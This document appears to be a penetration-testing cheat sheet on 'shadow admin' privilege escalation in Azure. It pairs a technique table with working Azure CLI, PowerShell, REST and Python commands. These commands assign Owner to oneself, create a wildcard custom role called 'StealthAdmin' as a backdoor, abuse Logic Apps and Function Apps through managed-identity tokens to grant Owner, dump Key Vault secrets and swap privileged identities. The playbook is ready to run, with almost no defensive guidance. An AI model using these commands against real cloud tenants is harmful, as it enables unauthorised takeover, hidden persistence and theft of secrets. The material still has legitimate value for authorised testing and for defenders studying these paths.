# Azure Shadow Admin Techniques

Shadow Admins are users or entities that do **not appear to have admin rights**, but can escalate or abuse misconfigured privileges to **gain full control** over Azure resources.

| **Technique** | **Azure Equivalent** | **Pentest Abuse Flow** |
|----|----|----|
| **Attach Admin Role to Self or Other** | Microsoft.Authorization/roleAssignments/write | Assign built-in role like Owner or User Access Administrator to own identity or another attacker-controlled object. |
| **Create New Role Assignment** | Use Azure CLI: az role assignment create --assignee \<id\> --role "Owner" --scope \<scope\> | Silent privilege escalation if user can assign roles at scope. |
| **Update Existing Role to Elevate Privileges** | Microsoft.Authorization/roleDefinitions/write | Modify custom role to include admin-level permissions (e.g., \* or Microsoft.Resources/\*). |
| **Abuse User Access Administrator Role** | Inherits roleAssignments/write → escalate via role assignment. | Often overlooked – can assign Owner to self or backdoor users. |
| **Reset Password or Credentials** | Graph API: Update user password, reset service principal credential | Take over other users or service principals. |
| **Create or Update Automation Runbook** | Microsoft.Automation/automationAccounts/runbooks/write + start | Run attacker payloads under the context of the assigned runbook identity. |
| **Abuse Logic Apps, Functions or WebJobs** | Modify workflows or function code to invoke privileged operations. | Use managed identity to perform role assignment, secret retrieval, or data exfiltration. |
| **Abuse Microsoft.ManagedIdentity/userAssignedIdentities/assign/action** | Assign privileged user-assigned identities to VMs or Functions. | Identity swap → execute under a different identity with higher privileges. |
| **Abuse Microsoft.Web/sites/config permissions** | Update AppSettings to inject secrets, keys, or manipulate identities. | Can inject key vault references or override connection strings. |
| **Run Resource Under Privileged Identity** | az vm identity assign, az functionapp identity assign | Assign attacker-controlled object to a privileged managed identity. |
| **Abuse Key Vault Access** | Access policies allowing secrets/get, keys/decrypt, certificates/get | Extract sensitive data (credentials, secrets) silently. |
| **Create or Modify Custom Role** | roleDefinitions/write | Create new custom role with hidden admin access and assign it. |
| **Create/Invoke Logic App or Azure Function** | With Microsoft.Web/sites/\* or Microsoft.Logic/workflows/\* permissions | Backdoor automation triggered on schedule or via webhook. |

## Attack Flow: Azure Shadow Admin via Logic App

```
Attacker compromises User-1
        │
        ▼
User-1 = Contributor
        │
        ▼
User-1 can modify an existing Logic App
        │
        ▼
Logic App executes using a Managed Identity
that already has Owner permissions
        │
        ▼
Logic App calls ARM REST API
        │
        ▼
Creates a new Owner role assignment
        │
        ▼
Attacker gains Owner
```

### 1. Escalate Privileges by Assigning “Owner” to Yourself

**Requirement**: User Access Administrator or permission to assign roles (Microsoft.Authorization/roleAssignments/write)

**Azure CLI:**

```bash
az role assignment create \\
--assignee \$(az ad signed-in-user show --query objectId -o tsv) \\
--role "Owner" \\
--scope /subscriptions/\<subscription-id\>
```

**PowerShell:**

```PS
\$me = az ad signed-in-user show --query objectId -o tsv

New-AzRoleAssignment -ObjectId \$me -RoleDefinitionName "Owner" -Scope "/subscriptions/\<subscription-id\>"
```

### 🧱 2. Create Custom Role with Full Permissions and Assign

**Requirement**: Microsoft.Authorization/roleDefinitions/write

**Azure CLI:**

```bash
az role definition create --role-definition '{

"Name": "StealthAdmin",

"IsCustom": true,

"Description": "Stealth Admin backdoor",

"Actions": \[ "\*" \],

"NotActions": \[\],

"AssignableScopes": \["/subscriptions/\<subscription-id\>"\]

}'

Then assign:

az role assignment create --assignee \<attacker-object-id\> --role
"StealthAdmin" --scope /subscriptions/\<subscription-id\>
```

### 🔁 3. Abuse Logic App to Assign Admin Role

**Requirement**: Contributor on Resource Group + Logic App permissions

**Step-by-step:**

1. Create a Logic App via ARM template or CLI
2. Logic App calls Azure Management REST API:

 ```JSON
        POST
        https://management.azure.com/subscriptions/\<sub-id\>/providers/Microsoft.Authorization/roleAssignments/\<guid\>?api-version=2022-04-01

        Body:
        {
            "properties": {
            "roleDefinitionId": "/subscriptions/\<sub-id\>/providers/Microsoft.Authorization/roleDefinitions/\<owner-role-id\>",
            "principalId": "\<attacker-object-id\>"
            }

        }
        ```

3. Trigger Logic App

You now have “Owner” rights silently granted via automation.

**🔑 4. Inject or Steal Secrets via Key Vault (if AccessPolicy allows)**

**Requirement**: secrets/get or keys/decrypt on Key Vault

az keyvault secret list --vault-name \<vault-name\> -o table

az keyvault secret show --vault-name \<vault-name\> --name
\<secret-name\>

**🔄 5. Assign Privileged Managed Identity to Resource You Control**

**Requirement**:
Microsoft.ManagedIdentity/userAssignedIdentities/assign/action

az webapp identity assign --name \<your-app-name\> --resource-group
\<rg\> --identities \<privileged-identity-id\>

**🪝 6. Abusing Automation Runbook or Function App**

If you control a Runbook/Function App with a system-assigned identity,
you can inject code that assigns roles, lists secrets, or pivots.

**PowerShell in Runbook:**

\# Add yourself to Owner

New-AzRoleAssignment -ObjectId "\<your-object-id\>" -RoleDefinitionName
"Owner" -Scope "/subscriptions/\<sub-id\>"

**Function App payload (Python):**

import requests

token =
requests.get("http://localhost:8080/msi/token?resource=https://management.azure.com/",
headers={"Metadata": "true"}).json()\['access_token'\]

headers = {'Authorization': f'Bearer {token}'}

payload = {

"properties": {

"roleDefinitionId":
"/subscriptions/\<sub-id\>/providers/Microsoft.Authorization/roleDefinitions/\<owner-role-id\>",

"principalId": "\<attacker-object-id\>"

}

}

requests.put("https://management.azure.com/subscriptions/\<sub-id\>/providers/Microsoft.Authorization/roleAssignments/\<uuid\>?api-version=2022-04-01",
json=payload, headers=headers)
